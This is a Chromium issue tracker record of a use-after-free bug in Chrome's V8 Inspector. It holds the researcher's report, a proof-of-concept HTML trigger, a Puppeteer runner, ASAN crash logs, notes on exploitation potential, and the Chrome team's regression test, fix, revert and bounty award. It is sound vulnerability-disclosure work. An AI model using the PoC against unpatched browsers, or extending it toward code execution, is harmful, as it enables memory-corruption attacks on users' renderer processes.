# Chrome V8 Inspector InjectedScript Use-After-Free Vulnerability

| Field | Value |
|-------|-------|
| **Issue ID** | [486927780](https://issues.chromium.org/issues/486927780) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Platform>DevTools |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | tn...@gmail.com |
| **Assignee** | sz...@google.com |
| **Created** | 2026-02-23 |
| **Bounty** | $3,000.00 |

## Description

---

### Report description

Chrome V8 Inspector InjectedScript Use-After-Free Vulnerability

---

### Bug location

#### Where do you want to report your vulnerability?

Chrome VRP – Report security issues affecting the Chrome browser. [See program rules](https://bughunters.google.com/about/rules/5745167867576320/chrome-vulnerability-reward-program-rules)

---

### The problem

#### Please describe the technical details of the vulnerability

# Chrome V8 Inspector InjectedScript Use-After-Free Vulnerability

## Summary

A use-after-free vulnerability in Chrome's V8 Inspector allows a malicious webpage to trigger memory corruption in the renderer process. The bug occurs when an iframe is removed during the `Error.prepareStackTrace` callback, which runs synchronously during `console.log()` processing, causing a dangling pointer to a freed `InjectedScript` object.

## Vulnerability Details

### Bug Type

Use-After-Free (UAF) in V8 Inspector

### Affected Component

- **File:** `v8/src/inspector/injected-script.cc`
- **Function:** `v8_inspector::InjectedScript::wrapObjectMirror()`
- **Line:** 628

### Affected Object

- **Class:** `v8_inspector::InjectedScript`
- **Size:** 232 bytes
- **Accessed Offset:** 224 bytes (`m_customPreviewEnabled` member)

### MiraclePtr Protection Status

**NOT PROTECTED** - The pointer is a raw C++ pointer, not wrapped in `raw_ptr<T>`.

The dangling pointer exists in the call chain:

- `V8ConsoleMessage::wrapArguments()` calls `session->wrapObject()` (v8-console-message.cc:300)
- `V8InspectorSessionImpl::wrapObject()` calls `findInjectedScript()` which returns a raw `InjectedScript*`
- This raw pointer is used after JavaScript execution that can free the pointed-to object

## Root Cause Analysis

### The Vulnerability Flow

1. **Setup:** A malicious page creates an iframe with a script that hooks `Error.prepareStackTrace`
2. **Trigger:** The iframe calls `console.log(new Error('trigger'))`
3. **V8ConsoleMessage Creation:** Chrome creates a `V8ConsoleMessage` object containing the console arguments
4. **Stack Trace Formatting:** When formatting the Error object for DevTools, V8 calls the custom `Error.prepareStackTrace` callback
5. **Critical Action:** Inside the callback, JavaScript removes the iframe (`window.frameElement.remove()`)
6. **Context Destruction:** Removing the iframe triggers:
   
   - `LocalWindowProxy::DisposeContext()`
   - `MainThreadDebugger::ContextWillBeDestroyed()`
   - `V8InspectorImpl::discardInspectedContext()`
   - `InspectedContext` destructor runs
   - `InjectedScript` is freed (via unique\_ptr in `m_injectedScripts` map)
7. **Dangling Pointer Use:** Control returns to `wrapArguments()` which still holds the raw `InjectedScript*` pointer and calls `wrapObjectMirror()` on freed memory

### Source Code Flow

```
console.log(new Error())
    ↓
V8Console::Log()
    ↓
ConsoleHelper::reportCall()
    ↓
V8ConsoleMessage::wrapArguments()
    ↓
    session->wrapObject()
        ↓
        findInjectedScript() → returns InjectedScript*
        ↓
        [Error.prepareStackTrace callback runs HERE]
        [JavaScript removes iframe]
        [InjectedScript FREED]
        ↓
        injectedScript->wrapObject() → UAF!
            ↓
            wrapObjectMirror() reads m_customPreviewEnabled at offset 224

```
## Impact

### Security Impact

- **Memory Corruption:** Read from freed 232-byte heap region
- **Renderer Process:** The crash occurs in the renderer process
- **Potential for Exploitation:**
  - The freed memory can be reclaimed by same-bucket allocations
  - With ASAN quarantine disabled (`quarantine_size_mb=0`), different Chrome objects naturally take the freed slot
  - If `m_customPreviewEnabled` (offset 224) reads as non-zero, additional virtual method calls occur on the fake object
  - With controlled memory reclamation, this could lead to code execution

### Memory Reuse Evidence

With ASAN quarantine disabled, we observe `heap-buffer-overflow` instead of `heap-use-after-free`, proving memory reuse:

```
0x113bf94dfc20 is located 344 bytes after 200-byte region
allocated by thread T8 here:
    ipcz::Router::Deserialize (200 bytes)

```

The freed InjectedScript slot is being reused by other allocations. The `ipcz::Router` (200 bytes, IPC system) lands nearby. The size mismatch causes an out-of-bounds read, but this demonstrates the allocator IS reusing the freed memory.

### Exploitation Challenges

1. The UAF read happens synchronously in the same call stack as the free
2. No JavaScript execution window exists between free and use
3. The InjectedScript (232 bytes) bucket may not align with JS-controllable objects
4. A separate thread/process would be needed to race the allocation

### Attack Prerequisites

1. DevTools must be connected (via CDP or `--auto-open-devtools-for-tabs`)
2. Runtime.enable protocol message must be active (automatic when Console is used)

### Trigger Variants

The vulnerability can be triggered via multiple iframe techniques:

1. **srcdoc iframe** - Inline HTML in srcdoc attribute (same-origin) ✅ CRASHES
2. **javascript: URL iframe** - Script in iframe src ✅ CRASHES
3. **blob: URL iframe** - Blob URL with HTML content ❌ Cross-origin blocked
4. **data: URL iframe** - Data URL with HTML content ❌ Cross-origin blocked

The key requirement is **same-origin access** to `parent.document` so the iframe can remove itself.

### Tested Configuration

- **Chrome Version:** 146.0.7680.0 (ASAN Build)
- **Platform:** Windows x64
- **Build:** Official Chromium ASAN build from chromium-browser-asan storage bucket

## Proof of Concept

### PoC (poc.html)

```
<!DOCTYPE html>
<html>
<body>
<script>
const iframe = document.createElement('iframe');
iframe.srcdoc = `<html><body><script>
Error.prepareStackTrace = function(error, trace) {
    window.frameElement.remove(); // Free InjectedScript
    return '';
};
console.log(new Error('trigger')); // UAF triggered on return
<\/script></body></html>`;
document.body.appendChild(iframe);
</script>
</body>
</html>

```
### Running with Puppeteer (pptr.js)

```
const puppeteer = require('puppeteer');
const path = require('path');

(async () => {
  const browser = await puppeteer.launch({
    executablePath: 'path/to/chrome-asan/chrome.exe',
    args: ['--no-sandbox'],
    headless: false,
    env: {
      ...process.env,
      ASAN_OPTIONS: 'quarantine_size_mb=0' // Force memory reuse
    }
  });
  const page = await browser.newPage();
  await page.goto(`file://${path.resolve(__dirname, 'poc.html')}`);
  await new Promise(r => setTimeout(r, 3000));
  process.exit(1);
})();

```
## ASAN Crash Report

### With Quarantine (heap-use-after-free detected)

```
==83024==ERROR: AddressSanitizer: heap-use-after-free on address 0x122206472b20
READ of size 1 at 0x122206472b20 thread T0
    #0 v8_inspector::InjectedScript::wrapObjectMirror() injected-script.cc:628
    #1 v8_inspector::InjectedScript::wrapObject() injected-script.cc:619
    #2 v8_inspector::V8InspectorSessionImpl::wrapObject() v8-inspector-session-impl.cc:317
    #3 v8_inspector::V8ConsoleMessage::wrapArguments() v8-console-message.cc:300
    ...

0x122206472b20 is located 224 bytes inside of 232-byte region
freed by thread T0 here:
    #0 operator delete
    #1 std::__Cr::default_delete<v8_inspector::InjectedScript>::operator()
    #2 v8_inspector::InspectedContext::~InspectedContext()
    #3 v8_inspector::V8InspectorImpl::discardInspectedContext()
    #4 blink::MainThreadDebugger::ContextWillBeDestroyed()
    ...

```
### With Quarantine Disabled (heap-buffer-overflow = memory reused)

```
==106596==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x126f6f4e50e0
READ of size 1 at 0x126f6f4e50e0 thread T0
    #0 v8_inspector::InjectedScript::wrapObjectMirror() injected-script.cc:628
    ...

0x126f6f4e50e0 is located 328 bytes after 216-byte region
allocated by thread T0 here:
    #0 operator new
    #1 v8_inspector::V8InspectorSessionImpl::create() v8-inspector-session-impl.cc:98
    ...

```

This shows that when ASAN quarantine is disabled, a 216-byte `V8InspectorSessionImpl` object took the freed slot, and the code read past it (328 bytes after = 216 + 112, while original access was at offset 224).

## Suggested Fix

The fix should ensure the InjectedScript pointer remains valid throughout the `wrapArguments()` operation. Options:

1. **Use safe pointers:** Convert the raw `InjectedScript*` to `raw_ptr<InjectedScript>` or similar smart pointer
2. **Re-validate before use:** After any JavaScript callback (like `prepareStackTrace`), re-lookup the InjectedScript from the context
3. **Prevent context destruction during callback:** Block iframe removal during console message processing

Example fix in `v8-console-message.cc`:

```
// Before: raw pointer used after JS execution
InjectedScript* injectedScript = session->findInjectedScript(m_contextId);
// ... JS runs here that could free injectedScript ...
injectedScript->wrapObject(...); // UAF!

// After: Re-fetch or validate after JS execution
InjectedScript* injectedScript = session->findInjectedScript(m_contextId);
// ... JS runs ...
injectedScript = session->findInjectedScript(m_contextId); // Re-fetch
if (!injectedScript) return; // Context was destroyed
injectedScript->wrapObject(...); // Safe

```
## Files Attached

- `poc.html` - Clean PoC file
- `pptr.js` - Puppeteer automation script
- `crash.txt` - ASAN crash log (with quarantine)
- `crash_quarantine0.txt` - ASAN crash log (quarantine disabled, shows memory reuse)

## Timeline

- **Tested Version:** Chromium 146.0.7680.0

#### Impact analysis

.

---

### The cause

#### What version of Chrome have you found the security issue in?

I've been able to reproduce the crash on versions 72-93, 109-146.

#### Is the security issue related to a crash?

Yes, it is related to a crash.

#### Choose the type of vulnerability

Memory Corruption (in a sandboxed process)

#### How would you like to be publicly acknowledged for your report?

5shain

## Attachments

- [pptr.js](attachments/pptr.js) (text/javascript, 836 B)
- [poc.html](attachments/poc.html) (text/html, 588 B)
- [crash_quarantine0.txt](attachments/crash_quarantine0.txt) (text/plain, 24.0 KB)
- [crash.txt](attachments/crash.txt) (text/plain, 39.0 KB)

## Timeline

### an...@chromium.org (2026-02-23)

Provisionally setting severity and foundin and forwarding to V8 shepherd.
Also CCing devtools folks.

### ya...@google.com (2026-02-24)

Danil, can you take a look at this? This is the same class of issues that you fixed in the past: overlooked JS execution may cause the data structure to change, which breaks later assumptions, leading to UAF.

### ch...@google.com (2026-02-24)

Setting milestone because of s0/s1 severity.

### ch...@google.com (2026-02-25)

This V8 bug has been marked as either a release blocker or a vulnerability bug. V8 bugs affect all OSs supported by Chrome, so the OS field has been updated to reflect this. Please update the bug with the correct OS field if it only affects a subset of OSes.

### sz...@google.com (2026-02-25)

Rewrote the repro as an V8 inspector-test and it reproduces cleanly with an ASAN build:

```
// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

const {session, contextGroup, Protocol} =
    InspectorTest.start('Tests that destroying context from inside of console.log does not crash');

const expression = `
  Error.prepareStackTrace = function(error, trace) {
    inspector.fireContextDestroyed();
    return '<mock formatted stack trace>';
  };
  console.log(new Error('trigger'));
`;

(async () => {
  Protocol.Runtime.enable();
  contextGroup.createContext('mock-iframe');
  const { params: { context: { uniqueId } } } = await Protocol.Runtime.onceExecutionContextCreated();

  await Protocol.Runtime.evaluate({ expression, uniqueContextId: uniqueId });
})();

```

### ml...@google.com (2026-02-25)

Does this affect production, or again just d8?

### sz...@google.com (2026-02-26)

No, this affects `chrome` and requires only minimal user interaction ("Open DevTools") to trigger. I have a fix in-flight here <https://crrev.com/c/7605102>.

### dx...@google.com (2026-02-26)

Project: v8/v8  

Branch:  main  

Author:  Simon Zünd [szuend@chromium.org](mailto:szuend@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7605102>

[inspector] Migrate InspectedContext and InjectedScript to cppgc

---


Expand for full commit details
```
     
    This change makes InspectedContext and InjectedScript garbage-collected 
    objects managed by cppgc. The ownership in maps is transitioned from 
    std::unique_ptr to cppgc::Persistent. This helps prevent crashes when 
    contexts are destroyed during JavaScript execution, as demonstrated by 
    the added regression test. 
     
    Bug: 487499304 
    Fixed: 486927780 
    Change-Id: I7e55823b5850441fe24911d481456e70cfc5c66f 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7605102 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Commit-Queue: Simon Zünd <szuend@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105462}

```

---

Files:

- M `src/inspector/injected-script.h`
- M `src/inspector/inspected-context.cc`
- M `src/inspector/inspected-context.h`
- M `src/inspector/v8-inspector-impl.cc`
- M `src/inspector/v8-inspector-impl.h`
- A `test/inspector/regress/regress-crbug-486927780-expected.txt`
- A `test/inspector/regress/regress-crbug-486927780.js`
- M `test/inspector/runtime/evaluate-async-expected.txt`

---

Hash: [912a425b2c81a03dbef9cb8f41d1e11c3fd4fb6d](https://chromiumdash.appspot.com/commit/912a425b2c81a03dbef9cb8f41d1e11c3fd4fb6d)  

Date: Thu Feb 26 05:32:04 2026


---

### dx...@google.com (2026-02-26)

Project: v8/v8  

Branch:  main  

Author:  Leszek Swirski [leszeks@chromium.org](mailto:leszeks@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7611687>

Revert "[inspector] Migrate InspectedContext and InjectedScript to cppgc"

---


Expand for full commit details
```
     
    This reverts commit 912a425b2c81a03dbef9cb8f41d1e11c3fd4fb6d. 
     
    Reason for revert: Failing on some tests (https://ci.chromium.org/ui/p/v8/builders/ci/V8%20Linux64%20TSAN%20-%20stress-incremental-marking/25512/overview) 
     
    Original change's description: 
    > [inspector] Migrate InspectedContext and InjectedScript to cppgc 
    > 
    > This change makes InspectedContext and InjectedScript garbage-collected 
    > objects managed by cppgc. The ownership in maps is transitioned from 
    > std::unique_ptr to cppgc::Persistent. This helps prevent crashes when 
    > contexts are destroyed during JavaScript execution, as demonstrated by 
    > the added regression test. 
    > 
    > Bug: 487499304 
    > Fixed: 486927780 
    > Change-Id: I7e55823b5850441fe24911d481456e70cfc5c66f 
    > Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7605102 
    > Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    > Commit-Queue: Simon Zünd <szuend@chromium.org> 
    > Cr-Commit-Position: refs/heads/main@{#105462} 
     
    Bug: 487499304 
    Bug: 486927780 
    No-Presubmit: true 
    No-Tree-Checks: true 
    No-Try: true 
    Change-Id: If5e4dd0314672825d0c43dd566a7d2bb9fc4f365 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7611687 
    Bot-Commit: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Auto-Submit: Leszek Swirski <leszeks@chromium.org> 
    Commit-Queue: Rubber Stamper <rubber-stamper@appspot.gserviceaccount.com> 
    Cr-Commit-Position: refs/heads/main@{#105466}

```

---

Files:

- M `src/inspector/injected-script.h`
- M `src/inspector/inspected-context.cc`
- M `src/inspector/inspected-context.h`
- M `src/inspector/v8-inspector-impl.cc`
- M `src/inspector/v8-inspector-impl.h`
- D `test/inspector/regress/regress-crbug-486927780-expected.txt`
- D `test/inspector/regress/regress-crbug-486927780.js`
- M `test/inspector/runtime/evaluate-async-expected.txt`

---

Hash: [c62dafb744af4b26c5393915ccb3cccf7e7e4af5](https://chromiumdash.appspot.com/commit/c62dafb744af4b26c5393915ccb3cccf7e7e4af5)  

Date: Thu Feb 26 09:02:20 2026


---

### ch...@google.com (2026-02-26)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to extended stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M144. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M145. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M146. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request - Manual Review: Merge review required: a reverted commit was detected after the merge request.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [144, 145, 146].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### sz...@google.com (2026-02-26)

Initial fix got reverted.

### dx...@google.com (2026-02-27)

Project: v8/v8  

Branch:  main  

Author:  Simon Zünd [szuend@chromium.org](mailto:szuend@chromium.org)  

Link:    <https://chromium-review.googlesource.com/7613210>

[inspector] Use std::shared\_ptr for InspectedContext

---


Expand for full commit details
```
     
    Unfortunately at this point we are not able to move `InspectedContext` 
    to the managed C++ heap due to missing Heap* collections and the lack 
    of labeling retainer links. 
     
    The next best thing we can do for now is use std::shared_ptr for 
    InspectedContext and keep an instance on the stack every time we can 
    potentially transition into user JS. 
     
    R=bmeurer@chromium.org 
     
    Fixed: 486927780 
    Change-Id: I5e4921521a24cc3cd53ffb6cb5b6b6f9d98490e2 
    Reviewed-on: https://chromium-review.googlesource.com/c/v8/v8/+/7613210 
    Auto-Submit: Simon Zünd <szuend@chromium.org> 
    Reviewed-by: Benedikt Meurer <bmeurer@chromium.org> 
    Commit-Queue: Simon Zünd <szuend@chromium.org> 
    Commit-Queue: Benedikt Meurer <bmeurer@chromium.org> 
    Cr-Commit-Position: refs/heads/main@{#105489}

```

---

Files:

- M `src/inspector/custom-preview.cc`
- M `src/inspector/injected-script.cc`
- M `src/inspector/v8-console-message.cc`
- M `src/inspector/v8-console.cc`
- M `src/inspector/v8-debugger-agent-impl.cc`
- M `src/inspector/v8-debugger.cc`
- M `src/inspector/v8-heap-profiler-agent-impl.cc`
- M `src/inspector/v8-inspector-impl.cc`
- M `src/inspector/v8-inspector-impl.h`
- M `src/inspector/v8-inspector-session-impl.cc`
- M `src/inspector/v8-runtime-agent-impl.cc`
- M `src/inspector/value-mirror.cc`
- A `test/inspector/regress/regress-crbug-486927780-expected.txt`
- A `test/inspector/regress/regress-crbug-486927780.js`

---

Hash: [ba0258ba96097bc799c61b145164ec343b56d37b](https://chromiumdash.appspot.com/commit/ba0258ba96097bc799c61b145164ec343b56d37b)  

Date: Fri Feb 27 05:20:14 2026


---

### sp...@google.com (2026-03-27)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $3000.00 for this report.

Rationale for this decision:
Baseline. Mildly mitigated (sandboxed/renderer) 


Important: This payment will be issued by Bugcrowd. You will receive an email from Bugcrowd in the next 24 hours which contains a submission you must claim to be rewarded.

If you do not receive an email from them, please check your spam folder and then reach out to us via a comment here. For issues related to Bugcrowd itself, please contact them via https://bugcrowd.com/support.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.

### ch...@google.com (2026-06-06)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/486927780)*
